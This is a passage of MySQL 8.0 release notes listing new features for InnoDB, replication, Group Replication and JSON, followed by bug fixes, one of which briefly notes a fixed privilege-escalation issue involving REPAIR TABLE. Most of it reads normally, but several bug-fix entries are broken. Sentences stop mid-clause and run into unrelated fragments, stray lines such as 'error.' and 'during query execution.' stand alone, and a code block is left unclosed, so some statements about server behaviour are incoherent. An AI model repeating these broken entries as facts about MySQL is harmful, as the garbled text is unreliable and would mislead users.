  By default, `InnoDB` reads uncommitted data
  when calculating statistics. In the case of an uncommitted
  transaction that deletes rows from a table,
  `InnoDB` excludes records that are
  delete-marked when calculating row estimates and index
  statistics, which can lead to non-optimal execution plans for
  other transactions that are operating on the table concurrently
  using a transaction isolation level other than
  [`READ UNCOMMITTED`](/doc/refman/8.0/en/innodb-transaction-isolation-levels.html#isolevel_read-uncommitted). To avoid
  this scenario, a new configuration option,
  [`innodb_stats_include_delete_marked`](/doc/refman/8.0/en/innodb-parameters.html#sysvar_innodb_stats_include_delete_marked),
  can be enabled to ensure that `InnoDB` includes
  delete-marked records when calculating persistent optimizer
  statistics.
  (Bug #23333990)
* **InnoDB:**
  Geometry parsing and bounding box computational code for R-trees
  was moved from `InnoDB` to the server.
  (WL #9439)
* **InnoDB:**
  `InnoDB` now supports `NOWAIT`
  and `SKIP LOCKED` options with `SELECT
  ... FOR SHARE` and `SELECT ... FOR
  UPDATE` locking read statements.
  `NOWAIT` causes the statement to return
  immediately if a requested row is locked by another transaction.
  `SKIP LOCKED` removes locked rows from the
  result set. See
  [Locking Read Concurrency with NOWAIT and SKIP LOCKED](/doc/refman/8.0/en/innodb-locking-reads.html#innodb-locking-reads-nowait-skip-locked).

  `SELECT ... FOR SHARE` replaces `SELECT
  ... LOCK IN SHARE MODE`, but `LOCK IN SHARE
  MODE` remains available for backward compatibility. The
  statements are equivalent. However, `FOR SHARE`
  supports `NOWAIT`, `SKIP
  LOCKED`, and `OF
  tbl_name` options. See
  [SELECT Statement](/doc/refman/8.0/en/select.html).

  `OF tbl_name`
  applies locking queries to named tables.

  Note

  `OF` now is a reserved word and cannot be
  used as an identifier without identifier quoting.

  `SELECT ... FOR SHARE` and `SELECT ...
  FOR UPDATE` statements now require the
  [`SELECT`](/doc/refman/8.0/en/privileges-provided.html#priv_select) privilege and at least one
  of the [`DELETE`](/doc/refman/8.0/en/privileges-provided.html#priv_delete),
  [`LOCK TABLES`](/doc/refman/8.0/en/privileges-provided.html#priv_lock-tables), or
  [`UPDATE`](/doc/refman/8.0/en/privileges-provided.html#priv_update) privileges. Previously,
  only the [`SELECT`](/doc/refman/8.0/en/privileges-provided.html#priv_select) privilege was
  required.
  (WL #8919, WL #3597)
* **InnoDB:**
  The `InnoDB` data-at-rest encryption feature
  now supports encryption of redo log and undo log data,
  controlled by the
  [`innodb_redo_log_encrypt`](/doc/refman/8.0/en/innodb-parameters.html#sysvar_innodb_redo_log_encrypt) and
  [`innodb_undo_log_encrypt`](/doc/refman/8.0/en/innodb-parameters.html#sysvar_innodb_undo_log_encrypt)
  configuration options. See
  [Redo Log Encryption](/doc/refman/8.0/en/innodb-data-encryption.html#innodb-data-encryption-redo-log), and
  [Undo Log Encryption](/doc/refman/8.0/en/innodb-data-encryption.html#innodb-data-encryption-undo-log).
  (WL #9290, WL #9289)
* **InnoDB:**
  `InnoDB` internal temporary tables that are
  stored on disk now support multiple cursor positions, permitting
  single writer and multiple reader access within the same thread.
  The purpose of this enhancement is to provide support for
  recursive and non-recursive common table expressions (CTEs).

  Additionally, consistent-read access to
  `InnoDB` on-disk internal temporary tables is
  replaced by a dirty-read scheme, and row counts for
  `InnoDB` on-disk internal temporary tables now
  use row count statistics instead of slower table scans.
  (WL #9248)
* **InnoDB:**
  `InnoDB` now compresses large objects into a
  sequence of smaller `zlib` streams for tables
  that use `ROW_FORMAT=COMPRESSED`. Previously,
  large object data was compressed into a single
  `zlib` stream.
  (WL #9263)
* **Replication:**
  When a negative or fractional timeout parameter was supplied to
  `WAIT_UNTIL_SQL_THREAD_AFTER_GTIDS()`, the
  server behaved in unexpected ways. With this fix:

  + A fractional timeout value is read as-is, with no round-off.
  + A negative timeout value is rejected with an error if the
    server is on a strict SQL mode; if the server is not on a
    strict SQL mode, the value makes the function return NULL
    immediately without any waiting and then issue a warning.

  (Bug #24976304, Bug #83537)
* **Replication:**
  Work has been done to reduce contention between receiver (I/O)
  and applier (SQL) replication threads. This ensures slaves keep
  up with a higher insert load on their master.
  (Bug #78246, Bug #21753696, WL #8599)
* **Replication:**
  Added the
  [`binlog_expire_logs_seconds`](/doc/refman/8.0/en/replication-options-binary-log.html#sysvar_binlog_expire_logs_seconds)
  system variable, which sets an interval in seconds for purging
  of the binary log. The effects of this variable and
  [`expire_logs_days`](/doc/refman/8.0/en/replication-options-binary-log.html#sysvar_expire_logs_days) are
  cumulative, making it possible to set a period such as 1.5 days.
  To completely disable automatic binary log purging, set both
  variables equal to 0, which is the default value for both of
  them.
  (Bug #71697, Bug #18260088, WL #9237)
* **Replication:**
  Performance schema tables have been added to monitor replication
  lags and queues. The
  [`replication_connection_status`](/doc/refman/8.0/en/performance-schema-replication-connection-status-table.html) table
  has updated information on the last transaction queued in the
  relay log, as well as the transaction currently being queued in
  the relay log. The
  [`replication_applier_status_by_coordinator`](/doc/refman/8.0/en/performance-schema-replication-applier-status-by-coordinator-table.html)
  table has updated information on the last transaction written to
  the buffer of a worker, as well as the transaction currently
  being processed by the coordinator. The
  [`replication_applier_status_by_worker`](/doc/refman/8.0/en/performance-schema-replication-applier-status-by-worker-table.html)
  table has updated information on the last transaction applied by
  the worker, as well as on the transaction currently being
  applied. The information presented in each of these tables
  contains the transaction's GTID, commit timestamps, processing
  stage timestamp, and the timestamp of the completion.

  In the
  [`replication_applier_status_by_worker`](/doc/refman/8.0/en/performance-schema-replication-applier-status-by-worker-table.html)
  table, the `LAST_SEEN_TRANSACTION` column is
  replaced by the `APPLYING_TRANSACTION` column.
  (WL #7374)
* **Replication:**
  The new binlog\_expire\_logs\_seconds variable is a global server
  variable in addition to the existing expire\_logs\_days variable.
  The purpose is to facilitate finer grained retention policies of
  binary logs than the current day granularity.
  (WL #9237)
* **Replication:**
  Correct recovery of DDL statements or transactions by binary log
  implements support for correct recovery of DDL transactions
  based on the binary log data. In the context of the new
  data-dictionary it becomes possible to make metadata changes and
  write them to the binary log as a single transaction by using
  the 2-phase commit protocol.
  (WL #9175)
* **Replication:**
  Multi-source replication now supports per-channel replication
  filters. This makes it possible to filter out the execution of
  selected replicated data from a specific channel. Until now
  replication filters have been global, and only applicable to all
  channels.
  (WL #7361)
* **Replication:**
  Row-based replication now uses extended table metadata in the
  binary log. The extended metadata serves two major purposes:
  slaves use the metadata to transfer data smoothly when its table
  structure is different from master's, and external software can
  use the metadata to decode row events and store the data into
  external databases.
  (WL #4618)
* **Replication:**
  An infrastructure for GTID based delayed replication and
  replication lag monitoring has been added to enable you to
  properly monitor replication lag. Two new timestamps that are
  associated with each transaction (not each event or statement)
  in the binary log have been introduced. The
  original\_commit\_timestamp is in microseconds since the epoch
  when the transaction was committed on the original master, and
  the immediate\_commit\_timestamp is in microseconds since the
  epoch when the transaction was committed on the immediate
  master.
  (WL #7319)
* **Replication:**
  The [`RESET MASTER`](/doc/refman/8.0/en/reset-master.html) statement has
  been extended to allow specification of a binary log file
  number. The `RESET MASTER TO` statement accepts
  an argument which specifies the index of the new binary log file
  to use. The purpose is to simplify failover procedures by
  replacing the `FLUSH BINARY LOGS` and
  `PURGE BINARY LOGS TO` statements with a single
  `RESET MASTER` statement.
  (WL #9110)
* **Replication:**
  The process used for how delay is defined and calculated for
  delayed replication have been improved. This relies on a new
  timestamp in the binary log, the immediate\_commit\_timestamp,
  which is the number of microseconds since epoch when the
  transaction was written to the binary log of the immediate
  master. This means that the delay is no longer computed
  per-event, it is now applied per-transaction.
  (WL #7318)
* **Replication:**
  It is now possible to specify whether information written into
  the binary log enables replication slaves to parallelize based
  on commit timestamps, or on transaction write sets.

  Using write sets has a the potential for greater parallelism
  than using commit timestamps since it does not depend on the
  commit history. When applying binary logs in this fashion on a
  replication slave, it may be able to leverage capabilities of
  the underlying computing hardware (such as CPU cores) and thus
  speed up this process.

  The interface for choosing the source of parallelization is
  implemented as a new server system variable
  [`binlog_transaction_dependency_tracking`](/doc/refman/8.0/en/replication-options-binary-log.html#sysvar_binlog_transaction_dependency_tracking)
  which can take any one of the values
  `COMMIT_ORDER`, `WRITESET`, or
  `WRITESET_SESSION`.
  `COMMIT_ORDER` (the default) causes
  parallelization information to be logged using commit
  timestamps; `WRITESET` causes this information
  to be logged using write sets in such a way that any
  transactions not updating the same row can be parallelized; and
  `WRITESET_SESSION` acts in the same fashion as
  `WRITESET`, except that updates originating
  with the same session cannot be reordered. The size of the row
  hash history that is kept in memory for tracking transaction
  dependencies can be set using
  [`binlog_transaction_dependency_history_size`](/doc/refman/8.0/en/replication-options-binary-log.html#sysvar_binlog_transaction_dependency_history_size),
  also introduced in this release.
  (WL #9556, WL #10750)
* **Group Replication:**
  View change events from a group can now be replicated to an
  external multithreaded slave (MTS) of type
  `DATABASE`.
  (Bug #25170698, Bug #84008)
* **Group Replication:**
  Group Replication now supports `SAVEPOINT` SQL
  transactions.
  (WL #9837, WL #10520)
* **JSON:**
  Added the JSON utility function
  [`JSON_PRETTY()`](/doc/refman/8.0/en/json-utility-functions.html#function_json-pretty), which prints an
  existing [`JSON`](/doc/refman/8.0/en/json.html) value, or any
  string that can successfully be parsed as a JSON document, in a
  format that can be easily read by humans. Each JSON object
  member or array value is displayed on a separate line of the
  output; each child object or array is intended 2 spaces with
  respect to its parent.

  Examples:

  ```
  mysql> SELECT JSON_PRETTY('123');
  +--------------------+
  | JSON_PRETTY('123') |
  +--------------------+
  | 123                |
  +--------------------+

  mysql> SELECT JSON_PRETTY("[1,3,5]");
  +------------------------+
  | JSON_PRETTY("[1,3,5]") |
  +------------------------+
  | [
    1,
    3,
    5
  ]      |
  +------------------------+

  mysql> SELECT JSON_PRETTY('{"a":"10","b":"15","x":"25"}');
  +---------------------------------------------+
  | JSON_PRETTY('{"a":"10","b":"15","x":"25"}') |
  +---------------------------------------------+
  | {
    "a": "10",
    "b": "15",
    "x": "25"
  }   |
  +---------------------------------------------+
  ```

  (WL #9191)
* **JSON:**
  Previously, when sorting [`JSON`](/doc/refman/8.0/en/json.html)
  values in a query using `ORDER BY`, each value
  was represented by a part having a fixed length in the sort key,
  each such part requiring 1K of memory. In many cases this usage
  was excessive—for example, an integer scalar value
  requires only a relatively very few bytes, so that the remainder
  of the 1K (90% or more) was taken up by padding.

  Variable length parts for JSON sort keys have been introduced to
  address this issue, with each key part now taking up only the
  space that is needed to store the value. This has the following
  benefits for performance:

  + Because sort buffer space is used more effectively,
    filesorts need not flush to disk as early or often, which
    means that more data can be sorted in memory.
  + Shorter keys can be compared more quickly than longer ones,
    providing a noticeable improvement in performance for
    in-memory sorts as well as sorts requiring disk usage.

  (WL #8741)
* The [`WEIGHT_STRING()`](/doc/refman/8.0/en/string-functions.html#function_weight-string) debugging
  function no longer supports the `LEVEL` clause.
  (Bug #25469683, Bug #84723)
* For Developer Studio 12.5, 32-bit builds are now disabled unless
  the [`FORCE_UNSUPPORTED_COMPILER`](/doc/refman/8.0/en/source-configuration-options.html#option_cmake_force_unsupported_compiler)
  option is given.
  (Bug #25267157, Bug #84230)
* Several foreign key constraint checks that were storage engine
  agnostic were being done inside `InnoDB`. These
  are now done at the SQL layer.
  (Bug #25252847)
* Some GIS out-of-bounds checking was simplified. Thanks to Daniel
  Black for the contribution.
  (Bug #25202470, Bug #84062)
* The set of compiler flags used for Developer Studio 12.5 was
  improved.
  (Bug #25148549, Bug #83955)
* **CMake** now uses
  `CMAKE_POLICY` of `CMP0022
  NEW` rather than `CMP0022 OLD`.
  (Bug #25090147, Bug #83804)
* If MySQL was configured to build with the
  `-Wno-error` option,
  **mysql\_config** produced incorrect output for
  its [`--cflags`](/doc/refman/8.0/en/mysql-config.html#option_mysql_config_cflags) option.

  The set of compiler options that **mysql\_config**
  and **pkg-config** produce now is determined by
  whitelisting rather than blacklisting.
  (Bug #25040566, Bug #22898475, Bug #80662)
* The performance of UTF-8 binary collations was improved.
  (Bug #24788778, Bug #83247, Bug #25076862)
* The systemd service file for **mysqld** now
  includes a `Documentation` value in the
  `[Unit]` section to provide a link to the
  systemd documentation in the MySQL Reference Manual.
  (Bug #24735762)
* Unit testing now uses Google Mock 1.8.
  (Bug #24572381, Bug #82823)
* The unimplemented and nonstandard `WITH CUBE`
  clause for `GROUP BY` is no longer supported.

  Note

  `CUBE` now is a reserved word and cannot be
  used as an identifier without identifier quoting.

  (Bug #24572048, Bug #82821)
* These outdated build scripts were removed from MySQL source
  distributions: `BUILD/SETUP.sh`,
  `BUILD/autorun.sh`,
  `BUILD/cmake_configure.sh`,
  `BUILD/compile-dist`, and
  `cmake/configure.pl`.
  (Bug #24512933)
* The removal of the `mysql_shutdown()` C API
  function in MySQL 8.0.0 has been reverted. It is still to be
  removed in a future MySQL version, but that removal has been
  deferred.
  (Bug #24496976, Bug #82681, WL #9014)
* Consistency and maintainability of Debian/Ubuntu packaging
  maintainer scripts was improved.
  (Bug #23588977)
* In-place [`ALTER TABLE`](/doc/refman/8.0/en/alter-table.html) operations
  are now possible for column modifications of tables containing
  generated columns that depend on columns with a
  `DEFAULT` value if the modified columns are not
  involved in the generated column expressions. For example,
  changing the `NULL` property of a separate
  column can be done in place without a table rebuild.
  (Bug #22987899, Bug #80832)
* For dumps of the `mysql` system database,
  **mysqldump** no longer generates DDL statements
  for the `innodb_index_stats` and
  `innodb_table_stats` tables. Such statements
  fail at dump reload time because those tables are not user
  accessible.
  (Bug #22655287)
* If **mysqld** is invoked with
  `--daemonize`, `stdout` and
  `stderr` are redirected to
  `/dev/null` if connected to a terminal type
  device, so that **mysqld** can behave as a true
  daemon.
  (Bug #21627629)
* **mysql\_secure\_installation** is more strict
  about what it considers valid yes and no responses.
  (Bug #13344753, Bug #62925)
* MySQL client and utility programs reported their own
  program-specific version number when invoked with the
  `--version` option, and the version strings did
  not follow a consistent format. Now these programs print the
  MySQL version number (same as **mysqld**) in a
  consistent format.
  (Bug #11763201, Bug #55885)
* A new `mysqldump` option,
  [`--network-timeout`](/doc/refman/8.0/en/mysqldump.html#option_mysqldump_network-timeout), enables
  large tables to be dumped by setting
  [`max-allowed-packet`](/doc/refman/8.0/en/mysqldump.html#option_mysqldump_max-allowed-packet) to its
  maximum value and network read and write timeouts to a large
  value. This option is enabled by default. To disable it, use
  [`--skip-network-timeout`](/doc/refman/8.0/en/mysqldump.html#option_mysqldump_network-timeout).
  (Bug #11754493, Bug #46103)
* Added two JSON aggregation functions
  [`JSON_ARRAYAGG()`](/doc/refman/8.0/en/aggregate-functions.html#function_json-arrayagg) and
  [`JSON_OBJECTAGG()`](/doc/refman/8.0/en/aggregate-functions.html#function_json-objectagg). The
  [`JSON_ARRAYAGG()`](/doc/refman/8.0/en/aggregate-functions.html#function_json-arrayagg) function takes a
  column or column expression as an argument, and aggregates the
  result set as a single [`JSON`](/doc/refman/8.0/en/json.html)
  array, as shown here:

  ```
  mysql> SELECT col FROM t1;
  +--------------------------------------+
  | col                                  |
  +--------------------------------------+
  | {"key1": "value1", "key2": "value2"} |
  | {"keyA": "valueA", "keyB": "valueB"} |
  +--------------------------------------+
  2 rows in set (0.00 sec)

  mysql> SELECT JSON_ARRAYAGG(col) FROM t1;
  +------------------------------------------------------------------------------+
  | JSON_ARRAYAGG(col)                                                           |
  +------------------------------------------------------------------------------+
  | [{"key1": "value1", "key2": "value2"}, {"keyA": "valueA", "keyB": "valueB"}] |
  +------------------------------------------------------------------------------+
  1 row in set (0.00 sec)
  ```

  The order of the array elements is unspecified.

  `JSON_OBJECTAGG()` takes two columns or
  expressions which it interprets as a key and a value,
  respectively; it returns the result as a single
  `JSON` object, as shown here:

  ```
  mysql> SELECT id, col FROM t1;
  +------+--------------------------------------+
  | id   | col                                  |
  +------+--------------------------------------+
  |    1 | {"key1": "value1", "key2": "value2"} |
  |    2 | {"keyA": "valueA", "keyB": "valueB"} |
  +------+--------------------------------------+
  2 rows in set (0.00 sec)

  mysql> SELECT JSON_OBJECTAGG(id, col) FROM t1;
  +----------------------------------------------------------------------------------------+
  | JSON_OBJECTAGG(id, col)                                                                |
  +----------------------------------------------------------------------------------------+
  | {"1": {"key1": "value1", "key2": "value2"}, "2": {"keyA": "valueA", "keyB": "valueB"}} |
  +----------------------------------------------------------------------------------------+
  1 row in set (0.00 sec)
  ```

  A `NULL` key causes an error; duplicate keys
  are ignored.

  [Aggregate Functions](/doc/refman/8.0/en/aggregate-functions-and-modifiers.html).
  (Bug #78117, Bug #21647417, WL #7987)
* MySQL now supports an [`IMPORT
  TABLE`](/doc/refman/8.0/en/import-table.html) statement that imports `MyISAM`
  tables based on information contained in
  `.SDI` (serialized dictionary information)
  metadata files. This statement is useful for exporting
  “raw” table files from one server and importing
  them into another, and provides a faster alternative to dumping
  tables as a file of SQL statements using
  **mysqldump** and processing the dump file using
  **mysql**. For more information, see
  [IMPORT TABLE Statement](/doc/refman/8.0/en/import-table.html).
  (WL #7524)

### Bugs Fixed

* **Incompatible Change:**
  The stored definition of a view for which an explicit column
  name list was provided could be invalid. For example, for this
  statement:

  ```
  CREATE VIEW v1 (name2) AS SELECT 1 AS name1 UNION SELECT 2 ORDER BY name1;
  ```

  The stored definition looked like this, which is invalid:

  ```
  CREATE VIEW v1 AS SELECT 1 AS name2 UNION SELECT 2 AS 2 ORDER BY name1;
  ```

  Now column names within the stored definition are not replaced
  by the column name list:

  ```
  CREATE VIEW v1 (name2) AS SELECT 1 AS name1 UNION SELECT 2 AS 2 ORDER BY name1;
  ```

  An incompatibility resulting from this change is that the
  [`CREATE VIEW`](/doc/refman/8.0/en/create-view.html) statement can no
  longer be recreated solely from the
  `INFORMATION_SCHEMA`
  [`VIEWS`](/doc/refman/8.0/en/information-schema-views-table.html) table, because the
  `VIEW_DEFINITION` value does not show the
  column name list. Instead, you must also consult the
  [`COLUMNS`](/doc/refman/8.0/en/information-schema-columns-table.html) table to get the column
  name list. Alternatively (and more simply), use
  [`SHOW CREATE VIEW`](/doc/refman/8.0/en/show-create-view.html).
  (Bug #23265335, Bug #81377)
* **InnoDB; Microsoft Windows:**
  On a MySQL 64-bit build on Windows, a file I/O retry result was
  misinterpreted due to a missing cast necessary for the correct
  operation of the retry path, resulting in a failing assertion
  and operating system error.

* **InnoDB:**
  In debug builds, a call that initialized latch debugging raised
  an assertion due to a race condition.
  (Bug #25700405)
* **InnoDB:**
  The restriction that required the first undo tablespace to use
  space ID 1 was removed. The first undo tablespace may now be
  assigned a space ID other than 1. Space ID values for undo
  tablespaces are still assigned in a consecutive sequence.
  (Bug #25551311)
* **InnoDB:**
  A [`DROP TABLE`](/doc/refman/8.0/en/drop-table.html) operation raised an
  assertion on a server with an
  [`innodb_force_recovery`](/doc/refman/8.0/en/innodb-parameters.html#sysvar_innodb_force_recovery) setting
  of 5 or 6. [`DROP TABLE`](/doc/refman/8.0/en/drop-table.html) is no
  longer permitted with these
  [`innodb_force_recovery`](/doc/refman/8.0/en/innodb-parameters.html#sysvar_innodb_force_recovery) settings.

  (Bug #25082593)
* **InnoDB:**
  Loading `InnoDB` tables required more memory in
  MySQL 5.7 due primarily to the addition of in-memory structure
  members introduced with temporary table optimizations. The
  in-memory structure members, only used for temporary tables, are
  now only allocated as needed.

  (Bug #24923840, Bug #83375)
* **InnoDB:**
  After redo log recovery, the node size of an undo tablespace
  object could sporadically be zero, eventually causing an error.
  Additionally, the undo tablespace object was incorrectly placed
  on the LRU list, and the header page of the undo tablespace

  pages was not decremented correctly when pages were removed.
  (Bug #24464147)

  References: This issue is a regression of: Bug #21747906.
* **InnoDB:**
  The following code changes related to undo tablespace management
  were implemented:

  + An in-memory array for temporary tablespace rollback
    segments was added, freeing 32 slots in the
    `TRX_SYS` page for use by redo-enabled
    rollback segments.

    As a result of this change, you no longer need to consider
    temporary tablespace rollback segments when setting the
    [`innodb_rollback_segments`](/doc/refman/8.0/en/innodb-parameters.html#sysvar_innodb_rollback_segments)
    configuration option during configuration of separate undo
    tablespaces.
  + Code comments related to undo logs and rollback segments
    were revised.
  + Fixed arrays that list rollback segments and undo
    tablespaces were replaced by dynamic size arrays.
  + The function that initializes undo tablespaces was
    refactored.
  + A class was added for managing just-in-time creation of undo
    and undo file names.

* **InnoDB:**
  Changes to the `InnoDB` recovery process in

  unless the redo log record hash table that is populated by the
  scan reaches its memory threshold. In this case, a second scan
  is initiated that performs a simultaneous scan and apply.

* **Replication:**
  When using XA transactions, if a lock wait timeout or deadlock
  occurred for the applier (SQL) thread on a replication slave,
  the automatic retry did not work. The cause was that while the
  SQL thread would do a rollback, it would not roll the XA
  transaction back. This meant that when the transaction was
  retried, the first event was `XA START` which
  was invalid as the XA transaction was already in progress,
  leading to an `XAER_RMFAIL` error.

* **JSON:**
  Internal tests for MySQL JSON functionality ran out of stack
  space on some platforms when run against a debug-enabled server.
  Because timely checks were not made for stack usage, the server
  did not detect this situation, leading to a server exit.

  The fix for this issue is twofold:

  + Stack overrun checks are now made before attempting to
    serialize a nested array or object, so that the operation
    fails gracefully when processing deeply nested JSON
    documents, rather than causing an exit.
  + Serialization of JSON documents has been reorganized so that
    it requires less use of the stack when compiled without
    optimization.

* Init scripts failed to launch **mysqld\_safe** if
  a non-default base directory was used.
  (Bug #25261472, Bug #84219)
* `CMake` now detects whether a GCC 5.3.0 loop
  optimization bug occurs and attempts a workaround if so.

* **mysqld\_safe --no-defaults** did not work
  (inadvertent consequence of an earlier bug fix).
  (Bug #25244898, Bug #84173)
* Semicolon (`;`) characters within or between
  statements could cause distinct digests to be generated from
  identical statements.
  (Bug #25244533, Bug #83253)
* Components could not register services without referring to
  their private implementation. A
  `SERVICE_IMPLEMENTATION(component,service)`
  macro now enables this to be avoided.
  (Bug #25238906)
* Certain stored functions, if used in a query
  `WHERE` clause, could be handled using Index
  Condition Pushdown (which should not happen), resulting in a
  server exit.
  (Bug #25196653, Bug #25174454)
* For `ai_ci` collations based on Unicode
  Collation Algorithm 9.0.0, accented characters that compare
  equal were treated as different by
  [`LIKE`](/doc/refman/8.0/en/string-comparison-functions.html#operator_like) comparisons.

  multibyte characters that followed an escape sequence.
  (Bug #25147988, Bug #83950, Bug #25865525)
* The fix for Bug #25088048 caused the command used by
  **mysqld\_safe** to start the MySQL server to no
  longer include the **mysqld** path.
  (Bug #25144379)

  References: This issue is a regression of: Bug #25088048.
* For UCA collations, [`LIKE`](/doc/refman/8.0/en/string-comparison-functions.html#operator_like)
  comparisons against a pattern that ended with the escape
  character returned incorrect results.
  (Bug #25140629, Bug #83930)
* The default character set and collation were used instead of the
  character set and collation defined in
  `db.opt` file when upgrading the schema from
  MySQL 5.7 to MySQL 8.0.
  (Bug #25139901)
* Instead of updating the data dictionary cache at the end of DDL
  statements using separate function calls, the data dictionary
  cache is now updated as part of transaction commit.
  (Bug #25095798, Bug #83818)
* [`CREATE TABLE`](/doc/refman/8.0/en/create-table.html) now requires the
  [`FILE`](/doc/refman/8.0/en/privileges-provided.html#priv_file) privilege if `DATA
  DIRECTORY` or `INDEX DIRECTORY` is
  specified explicitly as a table or partition option.
  [`ALTER TABLE`](/doc/refman/8.0/en/alter-table.html) requires the
  [`FILE`](/doc/refman/8.0/en/privileges-provided.html#priv_file) privilege if either option
  is specified explicitly as a partition option (it ignores them
  if specified as table options).
  (Bug #25092566)
* There were some differences between ICU order and MySQL Unicode
  collations for Hungarian contractions and ligatures. MySQL now
  follows ICU order.
  (Bug #25090543)
* The data dictionary failed to initialize and start when using a
  binary collation. The query string generated to create the data
  dictionary schema did not add quotes to the binary collation
  name.
  (Bug #25054104, Bug #83706)
* Executing a stored procedure containing a query that accessed a
  view could allocate memory that was not freed until the session
  ended.
  (Bug #25053286)
* Compilation on FreeBSD 11 failed attempting to check
  `MAP_NORESERVE`, which is no longer defined.
  (Bug #25048128, Bug #83689)
* **mysql-test-run.pl** now checks whether the
  `TSAN_OPTIONS` environment variable is set. If
  so, the value is taken as the path name of a file containing
  ThreadSanitizer suppressions (errors to be ignored during test
  runs). Additionally, the `--sanitize` option now
  causes **mysql-test-run.pl** to scan the server
  error logs for ThreadSanizer messages.
  (Bug #24970905, Bug #83601)
* After starting the server with a nonzero
  [`--lower-case-table-names`](/doc/refman/8.0/en/server-system-variables.html#sysvar_lower_case_table_names)
  setting, an assertion was raised when `USE
  INFORMATION_SCHEMA;` was the first instruction from the
  first client.
  (Bug #24963580)
* For case-insensitive Unicode collations, the various space
  characters did not hash to the same value, resulting in
  incorrect comparisons between them.
  (Bug #24956750, Bug #83549)
* Dictionary clients now track uncommitted dictionary objects that
  are being modified by DDL statements, making uncommitted changes
  by the same session visible to a dictionary client without
  affecting the dictionary object cache prior to commit time.
  (Bug #24956365, Bug #83548)
* Simultaneous dictionary object cache misses were not handled
  correctly. An object retrieved by one thread could be evicted
  from the cache before a waiting thread attempted to access it.
  (Bug #24949179)
* `CMake` now avoids configuring the
  `-fexpensive-optimizations` option for GCC
  versions for which the option triggers faulty shift-or
  optimizations.
  (Bug #24947597, Bug #83517)
* `CMake` support was added for compiling using
  the `-std=c++03` option under Developer Studio
  12.5. This is now used rather than `stlport` by
  default.
  (Bug #24947136, Bug #83512, Bug #25229424)
* `NCHAR` and `NATIONAL CHAR`
  are synonyms, but

  [`CAST(expr AS
  NATIONAL CHAR)`](/doc/refman/8.0/en/cast-functions.html#function_cast) did not. Now both work.
  (Bug #24934161)
* OEL RPM packages now better detect which platforms have multilib

* The [`LOCATE()`](/doc/refman/8.0/en/string-functions.html#function_locate) function returned
  `NULL` if the *`substr`*
  or *`str`* argument was
  `NULL`, but not if the
  *`pos`* argument was
  `NULL`. Now it returns `NULL`
  if any argument is `NULL`.

  during query execution.
  (Bug #24909223)
* Information about building MySQL 5.6 compatibility libraries in
  the MySQL 5.7 and higher `.spec` file is
  needed only for building `libmysqlclient` and
  `libmysqld`. Information about building the
  `InnoDB` memcached plugin was removed.
  (Bug #24908345, Bug #83409)
* Incorrect updating of view metadata could raise an assertion.
  (Bug #24834622)
* Initialization of the `keyring_okv` plugin
  failed if the `STANDBY_SERVER` setting was
  missing from the `okvclient.ora`
  configuration file, effectively making this a mandatory setting.
  `STANDBY_SERVER` is now optional.
  (Bug #24816271)
* Data dictionary objects acquired by
  `Dictionary_client::acquire_uncached()` are now
  owned by the current auto-releaser instead of the caller. Also,
  acquisition of `TABLE_SHARE` view objects is
  performed by `acquire() and` clone() instead of
  `acquire_uncached()`.
  (Bug #24813358, Bug #83296)
* Privilege checking could be incorrect for a derived table used
  within a multiple-table [`UPDATE`](/doc/refman/8.0/en/update.html)
  invoked within a stored procedure or view object, for the second
  or subsequent execution of the object, if the derived table was
  merged into the outer query.
  (Bug #24810564)
* The [`Created_tmp_tables`](/doc/refman/8.0/en/server-status-variables.html#statvar_Created_tmp_tables) status
  variable was incremented in some cases when no temporary table
  was created.
  (Bug #24808970, Bug #83287)
* An in-place upgrade from MySQL 5.7 to MySQL 8.0 failed if
  parsing of a stored routine body failed while migrating the
  routine. Now a warning is reported and the routine is created
  without parsing its body. Also, warnings are now reported when
  dependency resolution fails for a view during view migration.
  (Bug #24805140, Bug #83275)
* For compilation, **mysql\_upgrade** is dependent
  on the dynamically generated
  `sql_commands_system_tables_data_fix.h` file,
  but a missing dependency could cause that file not to be
  generated.
  (Bug #24802377, Bug #83272)
* A race condition between transactions accessing the
  access-control list (ACL) cache and use of the ACL cache to
  populate `INFORMATION_SCHEMA` tables could
  cause a server exit.
  (Bug #24786029)
* For debug builds, [`EXPLAIN`](/doc/refman/8.0/en/explain.html) or
  [`DESCRIBE`](/doc/refman/8.0/en/describe.html) for a table with a
  database or table name longer than the maximum permitted length
  raised an assertion rather than displaying an appropriate error.
  (Bug #24751177, Bug #83114)
* The implementation of several
  `INFORMATION_SCHEMA` tables as views on data
  dictionary tables introduced a number of native SQL functions
  intended only for internal use by the server, but they could be
  invoked by users. Those functions now produce an error if
  invoked by users.

  error.
  (Bug #24679962)
* The encoding for the `utf8` character set
  permitted characters between U+D800 and U+DFFF as valid, though
  they are reserved for surrogate pairs and do not directly
  represent characters. They are now considered invalid.
  (Bug #24672415)
* A query could produce incorrect results if the
  `WHERE` clause contained a dependent subquery,
  the table had a secondary index on the columns in the select
  list followed by the columns in the subquery, and `GROUP
  BY` or `DISTINCT` permitted the query

  be specified on the command line; they can no longer be
  specified in option files. This could cause failure of init
  scripts that invoke **mysqld\_safe**. Such scripts
  now pass the value of the `MYSQLD_OPTS`
  environment variable as the first command-line argument to
  **mysqld\_safe**, with the value set to such
  command line-only **mysqld\_safe** option values
  as may be required. On platforms that use systemd, the

  `/etc/sysconfig/mysqld` with a line such as
  this:

  ```
  MYSQLD_OPTS=" --ledir=/mysqld_ledir --mysqld=my_wrapper "

* The data dictionary can contain entries for temporary tables
  (names beginning with `#sql`). These tables
  were exposed to `INFORMATION_SCHEMA` queries
  and through [`SHOW`](/doc/refman/8.0/en/show.html) statements. This
  could cause **mysqldump** and
  **mysqlpump** to fail when they attempted to dump

  (Bug #24437124)
* An assertion could be raised if an
  [`ER_LOCK_WAIT_TIMEOUT`](/doc/mysql-errors/8.0/en/server-error-reference.html#error_er_lock_wait_timeout) error
  occurred during execution of [`SHOW CREATE
  TRIGGER`](/doc/refman/8.0/en/show-create-trigger.html).
  (Bug #24420809, Bug #82483)
* Constant folding could produce incorrect results for large
  unsigned integers.
  (Bug #24401273, Bug #82425)
* Use of very long subpartition names could result in a server
  exit. Now partition or subpartition names larger than 64
  characters produce an
  [`ER_TOO_LONG_IDENT`](/doc/mysql-errors/8.0/en/server-error-reference.html#error_er_too_long_ident) error.
  (Bug #24400628, Bug #82429)
* The `Gis_wkb_vector<Gis_point>` copy
  constructor was not explicitly instantiated, causing build
  problems for the Intel compiler.
  (Bug #24397833, Bug #82358)
* Privilege escalation was possible by exploiting the way
  [`REPAIR TABLE`](/doc/refman/8.0/en/repair-table.html) used temporary
  files.
  (Bug #24388746)
